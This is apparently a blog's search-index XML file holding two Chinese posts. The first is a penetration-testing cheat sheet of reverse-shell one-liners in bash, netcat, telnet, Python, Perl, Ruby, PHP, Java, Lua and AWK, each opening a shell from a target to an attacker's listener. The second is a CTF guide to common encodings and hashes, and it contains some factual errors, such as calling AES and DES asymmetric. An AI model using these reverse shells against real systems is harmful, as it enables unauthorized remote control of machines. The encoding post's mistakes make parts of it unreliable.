<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>渗透测试之常见shell反弹姿势</title>
      <link href="posts/b956.html"/>
      <url>posts/b956.html</url>
      
        <content type="html"><![CDATA[<h2 id="常见反弹shell总结："><a href="#常见反弹shell总结：" class="headerlink" title="常见反弹shell总结："></a>常见反弹shell总结：</h2><h3 id="一、bash反弹"><a href="#一、bash反弹" class="headerlink" title="一、bash反弹"></a>一、bash反弹</h3><p> <strong><em>通用</em></strong></p><p>① 在kali机里面开启端口监听：</p><pre><code>nc -lvvp port        //port 为攻击主机端口号，并且此端口号没有被占用</code></pre><p>② 在目标主机上执行：</p><pre><code>bash -i &gt;&amp; /dev/tcp/攻击主机ip/port 0&gt;&amp;1        //port 为攻击主机端口号</code></pre><p>③ 解释</p><blockquote><p>bash -i：   打开一个交互的bash</p><p>.&gt;&amp;：    标准错误输出重定向到标准输出</p><p>/dev/tcp/x.x.x.x/port ：   意为调用socket,建立socket连接,其中x.x.x.x为要反弹到的主机ip，port为端口</p><p>0&gt;&amp;1：   标准输入重定向到标准输出，实现你与反弹出来的shell的交互</p></blockquote><blockquote><p>/dev/tcp/ 是Linux中的一个特殊设备,打开这个文件就相当于发出了一个socket调用，建立一个socket连接，读写这个文件就相当于在这个socket连接中传输数据。同理，Linux中还存在/dev/udp/。 </p></blockquote><p>④ 补充</p><blockquote><p>linux shell下常用的文件描述符是：</p><ol><li>标准输入 (stdin) ：代码为 0 ，使用 &lt; 或 &lt;&lt; ；</li><li>标准输出 (stdout)：代码为 1 ，使用 &gt; 或 &gt;&gt; ；</li><li>标准错误输出(stderr)：代码为 2 ，使用 2&gt; 或 2&gt;&gt;。</li></ol></blockquote><p><strong><em>其他版本</em></strong></p><pre><code>exec 5&lt;&gt;/dev/tcp/x.x.x.x/9999cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done</code></pre><blockquote><ul><li>第一条命令：建立与x.x.x.x:9999的tcp连接，并将标准输入输出作为device 5的标准输入输出</li><li>第二条命令：cat &lt;&amp;5 获取device5的输入; <code>while read line; do $line 2&gt;&amp;5 &gt;&amp;5</code> 一旦获取到命令便运行 然后将标准输入输出以及标准错误输出到device5中</li></ul></blockquote><h3 id="二、nc-netcat-反弹"><a href="#二、nc-netcat-反弹" class="headerlink" title="二、nc(netcat)反弹"></a>二、nc(netcat)反弹</h3><h4 id="1-e-参数可用"><a href="#1-e-参数可用" class="headerlink" title="1. -e 参数可用"></a>1. -e 参数可用</h4><p>① 在kali机里面开启端口监听：</p><pre><code>nc -lvvp port        //port 为攻击主机端口号，并且此端口号没有被占用如：nc -lvvp 1234</code></pre><p>② 在目标主机上执行：</p><pre><code>nc -e /bin/bash 攻击主机ip port如：nc -e /bin/bash 192.168.26.138 1234</code></pre><p>③ 还可在目标主机上这样执行（不实用）：</p><pre><code>nc x.x.x.x 1234|/bin/bash|nc x.x.x.x 4321                //在攻击主机上打开两个终端，分别监听 1234 和 4321 端口，得到反弹shell后，1234 终端 输入命令， 4321 终端就会获得执行相应命令后的结果</code></pre><p>④ 使用python语句进入交互式界面：</p><pre><code>python -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;</code></pre><h4 id="2-e-参数不可用"><a href="#2-e-参数不可用" class="headerlink" title="2. -e 参数不可用"></a>2. -e 参数不可用</h4><p>在目标主机使用如下命令：</p><pre><code>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.26.138 1234 &gt;/tmp/f</code></pre><p><strong>解释</strong>：</p><blockquote><ul><li><code>rm /tmp/f</code> 删除命令</li><li><code>mkfifo /tmp/f;</code> 在tmp目录下写fifo文件f</li><li><code>/bin/sh -i 2&gt;&amp;1</code> 将/bin/sh 的标准错误重定向到标准输出</li><li><code>nc x.x.x.x 2333 &gt;/tmp/f</code>将nc监听到的输入 输入到fifo</li></ul></blockquote><h3 id="三、telnet反弹"><a href="#三、telnet反弹" class="headerlink" title="三、telnet反弹"></a>三、telnet反弹</h3><p>① 在攻击主机上打开两个终端分别监听 1234 和 4321端口,(确保端口开放，并且不被占用)，得到反弹shell后，1234 终端 输入命令， 4321 终端就会获得执行相应命令后的结果：</p><pre><code>nc -lvvp 1234nc -lvvp 4321</code></pre><p>② 在目标主机上执行：</p><pre><code>telnet 攻击主机ip 1234 | /bin/bash | telnet 攻击主机ip 4321</code></pre><h3 id="四、脚本反弹"><a href="#四、脚本反弹" class="headerlink" title="四、脚本反弹"></a>四、脚本反弹</h3><p>​        脚本是在目标主机上执行，其中 x.x.x.x 均为攻击主机ip，并且需要提前在攻击主机上进行监听相关端口.</p><h4 id="0x01-python"><a href="#0x01-python" class="headerlink" title="0x01. python"></a>0x01. python</h4><pre><code>python -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;x.x.x.x&quot;,5555));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/bash&quot;,&quot;-i&quot;]);&#39;</code></pre><h4 id="0x02-perl"><a href="#0x02-perl" class="headerlink" title="0x02. perl"></a>0x02. perl</h4><p>方法一：</p><pre><code>perl -e &#39;use Socket;$i=&quot;x.x.x.x&quot;;$p=5555;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;&#39;</code></pre><p>方法二：</p><pre><code>perl -MIO -e &#39;$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,&quot;x.x.x.x:5555&quot;);STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;&#39;</code></pre><h4 id="0x03-Ruby"><a href="#0x03-Ruby" class="headerlink" title="0x03. Ruby"></a>0x03. Ruby</h4><pre><code>ruby -rsocket -e &#39;exit if fork;c=TCPSocket.new(&quot;x.x.x.x&quot;,&quot;5555&quot;);while(cmd=c.gets);IO.popen(cmd,&quot;r&quot;)&#123;|io|c.print io.read&#125;end&#39;</code></pre><h4 id="0x04-php"><a href="#0x04-php" class="headerlink" title="0x04. php"></a>0x04. php</h4><pre><code>php -r &#39;$sock=fsockopen(&quot;x.x.x.x&quot;,5555);exec(&quot;/bin/bash -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#39;</code></pre><h4 id="0x05-Java"><a href="#0x05-Java" class="headerlink" title="0x05. Java"></a>0x05. Java</h4><pre><code>    public class Revs &#123;    /**    * @param args    * @throws Exception     */    public static void main(String[] args) throws Exception &#123;        // TODO Auto-generated method stub        Runtime r = Runtime.getRuntime();        String cmd[]= &#123;&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;exec 5&lt;&gt;/dev/tcp/x.x.x.x/5555;cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done&quot;&#125;;        Process p = r.exec(cmd);        p.waitFor();    &#125;&#125;</code></pre><h4 id="0x06-Lua"><a href="#0x06-Lua" class="headerlink" title="0x06. Lua"></a>0x06. Lua</h4><pre><code>lua -e &quot;require(&#39;socket&#39;);require(&#39;os&#39;);t=socket.tcp();t:connect(&#39;x.x.x.x&#39;,&#39;5555&#39;);os.execute(&#39;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&#39;);&quot;</code></pre><h4 id="0x07-AWK-反弹"><a href="#0x07-AWK-反弹" class="headerlink" title="0x07. AWK 反弹"></a>0x07. AWK 反弹</h4><p>注意：攻击的机器监听，在收到shell的时候不可以输入enter，不然会断开</p><pre><code>awk &#39;BEGIN&#123;s=&quot;/inet/tcp/0/x.x.x.x/8080&quot;;for(;s|&amp;getline c;close(c))while(c|getline)print|&amp;s;close(s)&#125;&#39;</code></pre><p>以后遇到了会再补充进去。</p><p>参考文献：</p><p><a href="https://blog.csdn.net/wanzt123/article/details/81879599">https://blog.csdn.net/wanzt123/article/details/81879599</a></p><p><a href="https://www.bertramc.cn/2017/07/14/38.html">https://www.bertramc.cn/2017/07/14/38.html</a></p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
            <tag> shell反弹 </tag>
            
            <tag> web </tag>
            
            <tag> 安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF常见编码（超全）</title>
      <link href="posts/a36c.html"/>
      <url>posts/a36c.html</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>​    最近打了场ctf，真的是被各种编码以及加密方式给搞怕了，所以，今天就来整理一下ctf中常见的编码，顺便给这次比赛做一个总结。</p><h2 id="常见CTF编码及加解密"><a href="#常见CTF编码及加解密" class="headerlink" title="常见CTF编码及加解密"></a>常见CTF编码及加解密</h2><h2 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h2><blockquote><p>计算机中的数据都是按字节存储。一个字节(Byte)由8个二进制位组成(bit)。（组成范围是0~255(2^8^))  一个字节一共可以用来表示256种不同的状态，每一个状态对应一个符号，就是256个符号，从00000000到11111111。 </p></blockquote><h3 id="ASCII编码"><a href="#ASCII编码" class="headerlink" title="ASCII编码"></a>ASCII编码</h3><p>​    <strong>简述 ：</strong> </p><p>ASCII 码是对<strong>英语字符与二进制位之间</strong>的关系，做了统一规定。</p><p>基本的 ASCII 字符集共有 128 个字符，其中有 96 个可打印字符，包括常用的字母、数字、标点符号等，</p><p>​    如：空格SPACE 是32（二进制：00100000）；</p><p>​        数字0 是48(二进制：00110000)；</p><p>​        大写字母A 是65（二进制：01000001）。</p><p>另外还有 32 个控制字符（不能打印出来）。</p><p>这128个符号，只占用了一个字节的后面7位，最前面的一位统一规定为0。</p><p>​    </p><p>​    <strong>特征：</strong> <strong>只含有数字</strong></p><ul><li><p>0-9, 49-57</p></li><li><p>A-Z, 65-90</p></li><li><p>a-z, 97-122</p></li></ul><p>  <strong>举例：</strong></p><pre><code>明文：hello,world.十六进制：0x680x650x6c0x6c0x6f0xff0c0x770x6f0x720x6c0x640x2e十进制：1041011081081112551211911111410810046二进制：011010000110010101101100011011000110111100101100011101110110111101110010011011000110010000101110</code></pre><p>​    <strong><a href="https://www.107000.com/T-Ascii/">解码链接１</a></strong><br>    <strong><a href="http://www.ab126.com/goju/1711.html">解码链接２</a></strong></p><p>​    <strong>ASCII码对照表</strong>    </p><p><img src="/../img/1605670745231.png" alt="ASCII码对照表"></p><h3 id="base家族编码"><a href="#base家族编码" class="headerlink" title="base家族编码"></a>base家族编码</h3><blockquote><p>base16 / base32 / base64 / base58 / base85 / base 100</p></blockquote><p>​    <strong>简述：</strong></p><p>**Base16编码是将二进制文件转换成由16个字符组成的文本 **</p><p><strong>base32的编码表是由（A-Z、2-7）32个可见字符构成，“=”符号用作后缀填充。</strong></p><p><strong>base64的编码表是由（A-Z、a-z、0-9、+、/）64个可见字符构成，“=”符号用作后缀填充。</strong></p><p><strong>base58的编码表相比base64少了数字0，大写字母I，O，小写字母 l (这个是L），以及符号‘+’和‘/’</strong> </p><p>*<em>base91的密文由91个字符（0-9，a-z，A-Z,!#$%&amp;()</em>+,./:;&lt;=&gt;?@[]^_`{|}~”）组成**</p><p>**Base100编码/解码工具（又名：Emoji表情符号编码/解码），可将文本内容编码为Emoji表情符号；同时也可以将编码后的Emoji表情符号内容解码为文本。 **</p><p>​    <strong>原理：</strong></p><p>具体原理不再详细描述，（主要是太耗时间，可以自行百度）</p><p>​    <strong>举例：</strong></p><blockquote><p>明文：hello，world.123456</p></blockquote><pre><code>base16: 68656C6C6F2C776F726C642E313233343635特征：大写字母(A-Z)和数字(0-9)，不用‘=’补齐。</code></pre><pre><code>base32: NBSWY3DPFR3W64TMMQXDCMRTGQ3DK===特征：大写字母(A-Z)和数字(2-7)，不满5的倍数，用‘=’补齐。</code></pre><pre><code>base64: aGVsbG8sd29ybGQuMTIzNDY1特征：大小写字母（A-Z，a-z）和数字（0-9）以及特殊字符‘+’，‘/’，不满3的倍数，用‘=’补齐。</code></pre><pre><code>base58: 2smDFYXWKE8vc8XA8dadEYcSqcQb特征：相比Base64，Base58不使用数字&quot;0&quot;，字母大写&quot;O&quot;，字母大写&quot;I&quot;，和字母小写&quot;l&quot;，以及&quot;+&quot;和&quot;/&quot;符号，最主要的是后面不会出现&#39;=&#39;。</code></pre><pre><code>base85: BOu!rDst&gt;tGAhM&lt;A1fSl1GgsI特征：特点是奇怪的字符比较多，但是很难出现等号</code></pre><pre><code>明文：hello,world.123456base91: TPwJh&gt;go2Tv!_,aRA2IbLmA特征：由91个字符（0-9，a-z，A-Z,!#$%&amp;()*+,./:;&lt;=&gt;?@[]^_`&#123;|&#125;~”）组成不支持中文。</code></pre><pre><code>base100: 👟👜👣👣👦📦💳💃👮👦👩👣👛🐥🐨🐩🐪🐫🐬🐭特征：就是一堆Emoji表情</code></pre><p>​    <strong>在线编码</strong></p><p><a href="https://www.qqxiuzi.cn/bianma/base64.htm">base16 / base32 / base64 </a></p><p><a href="http://www.atoolbox.net/Tool.php?Id=932">base58</a><br><a href="http://www.atoolbox.net/Tool.php?Id=934">base85</a><br><a href="ctf.ssleye.com/base91.html">base91</a></p><p><a href="http://www.atoolbox.net/Tool.php?Id=936">base100</a></p><h3 id="MD5、SHA1、HMAC、NTLM等类似加密型"><a href="#MD5、SHA1、HMAC、NTLM等类似加密型" class="headerlink" title="MD5、SHA1、HMAC、NTLM等类似加密型"></a>MD5、SHA1、HMAC、NTLM等类似加密型</h3><h4 id="1、MD5"><a href="#1、MD5" class="headerlink" title="1、MD5"></a>1、MD5</h4><p>​    <strong>简述：</strong></p><p>​    一般MD5值是32位由数字“0-9”和字母“a-f”所组成的字符串，字母大小写统一；如果出现这个范围以外的字符说明这可能是个错误的md5值，就没必要再拿去解密了。</p><p>​    16位值是取的是8~24位。 </p><p>​    <strong>特征：</strong></p><p>​    有固定长度，一般是32位或者16位</p><p>​    由数字“0-9”和字母“a-f”组成</p><p>​    <strong>举例：</strong></p><pre><code>明文：hello，world.123456md5(hello，world.123456,32) = 5189503aae1b1c0a6fbf7ea9e3128ab0md5(hello，world.123456,16) = ae1b1c0a6fbf7ea9</code></pre><p>​    <strong>在线加解密</strong></p><p><a href="http://www.ttmd5.com/">MD5解密1</a></p><p><a href="https://www.cmd5.com/">MD5解密2</a></p><h4 id="2、SHA1"><a href="#2、SHA1" class="headerlink" title="2、SHA1"></a>2、SHA1</h4><p>​    <strong>简述</strong></p><p>​    SHA1是一种密码散列函数，SHA1可以生成一个被称为消息摘要的160位，20字节的散列值，散列值通常的呈现形式为<strong>40位十六进制数</strong>。这种加密和MD5类似。</p><p>​    <strong>特征：</strong></p><p>​    有固定长度，为40位的字符串</p><p>​    <strong>举例：</strong></p><pre><code>明文：hello，world.123456sha1（hello，world.123456）= 0179303b8f08fbc3d16cd23a4be5828790e12375</code></pre><p>​    <strong>在线加解密</strong></p><p><a href="http://www.ttmd5.com/hash.php?type=5">SHA1加解密1</a></p><p><a href="https://tool.oschina.net/encrypt?type=2">SHA1加解密2</a></p><h4 id="3、HMAC"><a href="#3、HMAC" class="headerlink" title="3、HMAC"></a>3、HMAC</h4><p>​    <strong>简述：</strong></p><p>​    HMAC (Hash-based Message Authentication Code) 常用于接口签名验证，这种算法就是在前两种加密的基础上引入了秘钥，而秘钥又只有传输双方才知道，所以基本上是破解不了的 。</p><p>​    <strong>特征：</strong></p><p>​    和MD5类似，但是有秘钥。</p><p>​    <strong>举例：</strong></p><p>​    <strong>在线加解密：</strong></p><p><a href="http://encode.chahuo.com/">HAMC加解密</a></p><h4 id="4、NTLM"><a href="#4、NTLM" class="headerlink" title="4、NTLM"></a>4、NTLM</h4><p>​    <strong>简述：</strong></p><p>​    这种加密是Windows的哈希密码，是 Windows NT 早期版本的标准安全协议。与它相同的还有Domain Cached Credentials（域哈希）。 </p><p>​    <strong>举例：</strong><br><img src="/../img/NTLM%E7%A4%BA%E4%BE%8B.png" alt="NTML解密"></p><p>​    <strong>在线解密：</strong></p><p><a href="https://www.jisuan.mobi/p11BbzHum6b3uyJW.html">NTML加解密</a></p><h4 id="5、类似加密穷举"><a href="#5、类似加密穷举" class="headerlink" title="5、类似加密穷举"></a>5、类似加密穷举</h4><table><thead><tr><th>#</th><th>算法</th><th>长度</th></tr></thead><tbody><tr><td>1</td><td>md5</td><td>32/16</td></tr><tr><td>2</td><td>sha1</td><td>40</td></tr><tr><td>3</td><td>sha256</td><td>64</td></tr><tr><td>4</td><td>sha512</td><td>128</td></tr><tr><td>5</td><td>adler32</td><td>8</td></tr><tr><td>6</td><td>crc32</td><td>8</td></tr><tr><td>7</td><td>crc32b</td><td>8</td></tr><tr><td>8</td><td>fnv132</td><td>8</td></tr><tr><td>9</td><td>fnv164</td><td>16</td></tr><tr><td>10</td><td>fnv1a32</td><td>8</td></tr><tr><td>11</td><td>fnv1a64</td><td>16</td></tr><tr><td>12</td><td>gost</td><td>64</td></tr><tr><td>13</td><td>gost-crypto</td><td>64</td></tr><tr><td>14</td><td>haval128,3</td><td>32</td></tr><tr><td>15</td><td>haval128,4</td><td>32</td></tr><tr><td>16</td><td>haval128,5</td><td>32</td></tr><tr><td>17</td><td>haval160,3</td><td>40</td></tr><tr><td>18</td><td>haval160,4</td><td>40</td></tr><tr><td>19</td><td>haval160,5</td><td>40</td></tr><tr><td>20</td><td>haval192,3</td><td>48</td></tr><tr><td>21</td><td>haval192,4</td><td>48</td></tr><tr><td>22</td><td>haval192,5</td><td>48</td></tr><tr><td>23</td><td>haval224,3</td><td>56</td></tr><tr><td>24</td><td>haval224,4</td><td>56</td></tr><tr><td>25</td><td>haval224,5</td><td>56</td></tr><tr><td>26</td><td>haval256,3</td><td>64</td></tr><tr><td>27</td><td>haval256,4</td><td>64</td></tr><tr><td>28</td><td>haval256,5</td><td>64</td></tr><tr><td>29</td><td>joaat</td><td>8</td></tr><tr><td>30</td><td>md2</td><td>32</td></tr><tr><td>31</td><td>md4</td><td>32</td></tr><tr><td>32</td><td>ripemd128</td><td>32</td></tr><tr><td>33</td><td>ripemd160</td><td>40</td></tr><tr><td>34</td><td>ripemd256</td><td>64</td></tr><tr><td>35</td><td>ripemd320</td><td>80</td></tr><tr><td>36</td><td>sha224</td><td>56</td></tr><tr><td>37</td><td>sha3-224</td><td>56</td></tr><tr><td>38</td><td>sha3-256</td><td>64</td></tr><tr><td>39</td><td>sha3-384</td><td>96</td></tr><tr><td>40</td><td>sha3-512</td><td>128</td></tr><tr><td>41</td><td>sha384</td><td>96</td></tr><tr><td>42</td><td>sha512/224</td><td>56</td></tr><tr><td>43</td><td>sha512/256</td><td>64</td></tr><tr><td>44</td><td>snefru</td><td>64</td></tr><tr><td>45</td><td>snefru256</td><td>64</td></tr><tr><td>46</td><td>tiger128,3</td><td>32</td></tr><tr><td>47</td><td>tiger128,4</td><td>32</td></tr><tr><td>48</td><td>tiger160,3</td><td>40</td></tr><tr><td>49</td><td>tiger160,4</td><td>40</td></tr><tr><td>50</td><td>tiger192,3</td><td>48</td></tr><tr><td>51</td><td>tiger192,4</td><td>48</td></tr><tr><td>52</td><td>whirlpool</td><td>128</td></tr><tr><td>53</td><td>mysql</td><td>老MYSQL数据库用的，16位，且第1位和第7位必须为0-8</td></tr><tr><td>54</td><td>mysql5</td><td>40</td></tr><tr><td>55</td><td>NTLM</td><td>32</td></tr><tr><td>56</td><td>Domain Cached Credentials</td><td>32</td></tr></tbody></table><h3 id="AES、DES、RC4、Rabbit、3DES型加密"><a href="#AES、DES、RC4、Rabbit、3DES型加密" class="headerlink" title="AES、DES、RC4、Rabbit、3DES型加密"></a>AES、DES、RC4、Rabbit、3DES型加密</h3><p>​    <strong>简述：</strong></p><p>以上都是非对称性加密算法，就是引入了密钥，密文特征与Base64类似， </p><p>​    <strong>在线解密：</strong><br><a href="https://www.sojson.com/encrypt_aes.html">非对称加密</a></p><h3 id="Unicode编码"><a href="#Unicode编码" class="headerlink" title="Unicode编码"></a>Unicode编码</h3><p>​    <strong>简述：</strong></p><p>Unicode（统一码、万国码、单一码）是一种在计算机上使用的字符编码。<br>它用两个字节来编码一个字符,字符编码一般用十六进制来表示.</p><p>​    <strong>举例：</strong> </p><p>Unicode有以下四种编码方式：</p><blockquote><p>明文：hello，world.</p></blockquote><pre><code>&amp;#x [hex]：&amp;#x0068;&amp;#x0065;&amp;#x006C;&amp;#x006C;&amp;#x006F;&amp;#xFF0C;&amp;#x0077;&amp;#x006F;&amp;#x0072;&amp;#x006C;&amp;#x0064;&amp;#x002E;&amp;# [hex]：&amp;#00104;&amp;#00101;&amp;#00108;&amp;#00108;&amp;#00111;&amp;#65292;&amp;#00119;&amp;#00111;&amp;#00114;&amp;#00108;&amp;#00100;&amp;#00046;\u [hex]：\U0068\U0065\U006C\U006C\U006F\U002C\U0077\U006F\U0072\U006C\U0064\U002E\u+ [hex]：\U+0068\U+0065\U+006C\U+006C\U+006F\U+FF0C\U+0077\U+006F\U+0072\U+006C\U+0064\U+002E</code></pre><p>​    <strong>在线编码：</strong></p><p><a href="http://www.mxcz.net/tools/Unicode.aspx">四种方式都有</a></p><p><a href="http://www.msxindl.com/tools/unicode16.asp">unicode16进制</a></p><p><a href="https://www.sojson.com/unicode.html">unicode</a></p><p><a href="http://tool.chinaz.com/tools/unicode.aspx">常见\u方式</a></p><h3 id="HTML实体编码"><a href="#HTML实体编码" class="headerlink" title="HTML实体编码"></a>HTML实体编码</h3><p>​    <strong>简述：</strong></p><p>​    字符实体是用一个编号写入HTML代码中来代替一个字符，在使用浏览器访问网页时会将这个编号解析还原为字符以供阅读。 </p><p>​    <strong>举例：</strong></p><pre><code>明文：hello，world.十进制：&amp;#104;&amp;#101;&amp;#108;&amp;#108;&amp;#111;&amp;#65292;&amp;#119;&amp;#111;&amp;#114;&amp;#108;&amp;#100;&amp;#46;十六进制：&amp;#x68;&amp;#x65;&amp;#x6C;&amp;#x6C;&amp;#x6F;&amp;#xFF0C;&amp;#x77;&amp;#x6F;&amp;#x72;&amp;#x6C;&amp;#x64;&amp;#x2E;</code></pre><p><img src="/../img/HTML%E5%AE%9E%E4%BD%93%E7%BC%96%E7%A0%81.png" alt="1605744295006"></p><p>​    <strong>在线加解密：</strong></p><p><a href="http://www.toolzl.com/tools/htmlende.html">HTML实体加解密1</a></p><p><a href="https://www.qqxiuzi.cn/bianma/zifushiti.php">HTML实体加解密2</a></p><h3 id="Escape、Unescape编码（-u）"><a href="#Escape、Unescape编码（-u）" class="headerlink" title="Escape、Unescape编码（%u）"></a>Escape、Unescape编码（%u）</h3><p>​    <strong>简述：</strong></p><p><strong>Escape/Unescape加密解码/编码解码</strong>,又叫%u编码，其实就是字符对应UTF-16 16进制表示方式前面加%u。<strong>Unescape解码/解密</strong>，就是去掉”%u”后，将16进制字符还原后，由utf-16转码到自己目标字符。如：字符“中”，UTF-16BE是：“6d93”，因此Escape是“%u6d93”，反之也一样！ </p><p>​    <strong>举例：</strong></p><pre><code>明文：hello，world.密文：%u0068%u0065%u006c%u006c%u006f%uff0c%u0077%u006f%u0072%u006c%u0064%u002e</code></pre><p>​    <strong>在线加解密：</strong></p><p><a href="http://web.chacuo.net/charsetescape/">Escape编码/解码</a></p><h3 id="URL编码"><a href="#URL编码" class="headerlink" title="URL编码"></a>URL编码</h3><p>​    <strong>简述：</strong></p><p>url编码又叫百分号编码，是统一资源定位(URL)编码方式。URL地址（常说网址）规定了常用地数字，字母可以直接使用，另外一批作为特殊用户字符也可以直接用（/,:@等），剩下的其它所有字符必须通过%xx编码处理。 现在已经成为一种规范了，基本所有程序语言都有这种编码，如js：有encodeURI、encodeURIComponent，PHP有 urlencode、urldecode等。编码方法很简单，在该字节ascii码的的16进制字符前面加%. 如 空格字符，ascii码是32，对应16进制是’20’，那么urlencode编码结果是:%20。 </p><p>​    <strong>特征：</strong></p><p>编码前面都有%</p><p>​    <strong>举例：</strong></p><p><img src="/../img/URL%E7%BC%96%E7%A0%81.png" alt="URL编码"></p><p>​    <strong>在线加解密：</strong></p><p><a href="http://web.chacuo.net/charseturlencode">URL加解密</a></p><h3 id="Hex编码"><a href="#Hex编码" class="headerlink" title="Hex编码"></a>Hex编码</h3><p>​    <strong>简述：</strong></p><p>​    Hex 全称 是Intel HEX。Hex文件是由一行行符合Intel HEX文件格式的文本所构成的ASCII文本文件。在Intel HEX文件中，每一行包含一个HEX记录。这些记录由对应机器语言码和/或常量数据的<strong>十六进制编码数字</strong>组成。 </p><p>​    <strong>特征：</strong></p><p>十六进制（Hexadecimal）</p><p>它是计算机中数据的一种表示方法，<strong>由0-9，A-F组 成，字母不区分大小写</strong>。</p><p>与10进制的对应关系是：0-9不变，A-F对应10-15。</p><p>​    <strong>举例：</strong></p><pre><code>明文：hello，world.密文（带%）：%68%65%6c%6c%6f%ef%bc%8c%77%6f%72%6c%64%2e密文（不带%）：68656C6C6FEFBC8C776F726C642E</code></pre><p>​    <strong>在线加解密：</strong></p><p><a href="https://www.107000.com/T-Hex">不带%</a></p><p><a href="http://stool.chinaz.com/hex">带%</a></p><h3 id="js专用加密"><a href="#js专用加密" class="headerlink" title="js专用加密"></a>js专用加密</h3><h4 id="1、JS颜文字加密"><a href="#1、JS颜文字加密" class="headerlink" title="1、JS颜文字加密"></a>1、JS颜文字加密</h4><p>​    <strong>特征：</strong></p><p>一堆颜文字构成的js代码，在F12中可直接解密执行</p><p>​    <strong>举例：</strong></p><p><img src="/../img/1605750605378.png" alt="JS颜文字加解密"></p><p>​    <strong>在线加密：</strong></p><p><a href="https://utf-8.jp/public/aaencode.html">JS颜文字加密</a></p><p>解密在F12的console中</p><h4 id="2、Jother编码"><a href="#2、Jother编码" class="headerlink" title="2、Jother编码"></a>2、Jother编码</h4><p>​    <strong>简述：</strong></p><p>jother是一种运用于javascript语言中利用少量字符构造精简的匿名函数方法对于字符串进行的编码方式。 </p><p>​    <strong>特征：</strong></p><p>只用 **! + ( ) [ ] { } **这八个字符就能完成对任意字符串的编码。可在F12中解密执行</p><p>​    <strong>举例：</strong></p><p><img src="/../img/1605751409787.png" alt="Jother编码"></p><p>​    <strong>在线解密：</strong><br><a href="http://tmxk.org/jother/">Jother</a></p><h4 id="4、JSFuck编码"><a href="#4、JSFuck编码" class="headerlink" title="4、JSFuck编码"></a>4、JSFuck编码</h4><p>​    <strong>特征：</strong></p><p><strong>与jother很像，只是少了{ }</strong> </p><p>​    <strong>举例：</strong></p><p><img src="/../img/1605751794549.png" alt="JSFuck编码"></p><p>​    <strong>在线加密：</strong></p><p><a href="http://www.jsfuck.com/">JSFuck加密</a></p><p>解密在F12的console中</p><h3 id="Quoted-printable编码"><a href="#Quoted-printable编码" class="headerlink" title="Quoted-printable编码"></a>Quoted-printable编码</h3><p>​    <strong>简述：</strong></p><p>它是多用途互联网邮件扩展（MIME) 一种实现方式。有时候我们可以邮件头里面能够看到这样的编码； </p><p>​    <strong>特征：</strong></p><p>任何一个8位的字节值可编码为3个字符：一个等号”=”后跟随两个十六进制数字(0–9或A–F)表示该字节的数值.</p><p>​    <strong>举例：</strong></p><pre><code>明文：天上掉下了个猪八戒密文：=E5=A4=A9=E4=B8=8A=E6=8E=89=E4=B8=8B=E4=BA=86=E4=B8=AA=E7=8C=AA=E5=85=AB=E6=88=92</code></pre><p>​    <strong>在线编码：</strong></p><p><a href="http://www.mxcz.net/tools/QuotedPrintable.aspx">在线编码</a></p><p>我就吃过该编码的亏，当时不知道啊/(ㄒoㄒ)/~~</p><h3 id="XXencode"><a href="#XXencode" class="headerlink" title="XXencode"></a>XXencode</h3><p>​    <strong>简述：</strong></p><p>​    XXencode将输入文本以每三个字节为单位进行编码。如果最后剩下的资料少于三个字节，不够的部份用零补齐。这三个字节共有24个Bit，以6bit为单位分为4个组，每个组以十进制来表示所出现的数值只会落在0到63之间。以所对应值的位置字符代替。 </p><p>​    <strong>特征：</strong></p><p>字符范围是：</p><p>​    0-9，A-Z，a-z，</p><p>​    一共64个字符。跟base64打印字符相比，就是UUencode多一个“-” 字符，少一个”/” 字符。 </p><p>​    <strong>举例：</strong></p><pre><code>明文：hello，world.密文：BO4JgP4yXf5RjQalY9U++</code></pre><p>​    <strong>在线加解密：</strong></p><p><a href="http://web.chacuo.net/charsetxxencode">UUencode加解密</a></p><h3 id="UUencode"><a href="#UUencode" class="headerlink" title="UUencode"></a>UUencode</h3><p>​    <strong>简述：</strong></p><p>​    UUencode是一种二进制到文字的编码，最早在unix邮件系统中使用，全称：Unix-to-Unix encoding，UUencode将输入文本以每三个字节为单位进行编码，如果最后剩下的资料少于三个字节，不够的部份用零补齐。三个字节共有24个Bit，以6-bit为单位分为4个组，每个组以十进制来表示所出现的字节的数值。这个数值只会落在0到63之间。然后将每个数加上32，所产生的结果刚好落在ASCII字符集中可打印字符（32-空白…95-底线）的范围之中。  </p><p>​    <strong>举例：</strong></p><pre><code>明文：hello,world.密文：,:&amp;5L;&amp;\L=V]R;&amp;0N</code></pre><p>​    <strong>在线解密&amp;工具</strong>：</p><p><a href="http://web.chacuo.net/charsetuuencode">UUencode1</a></p><p><a href="https://www.qqxiuzi.cn/bianma/uuencode.php">UUencode2</a></p><h3 id="aaencode编码"><a href="#aaencode编码" class="headerlink" title="aaencode编码"></a>aaencode编码</h3><p>​    <strong>特征：</strong></p><p>将JS代码转换成常用的<strong>网络表情</strong></p><p>​    <strong>举例：</strong></p><p><img src="/../img/1605772666057.png" 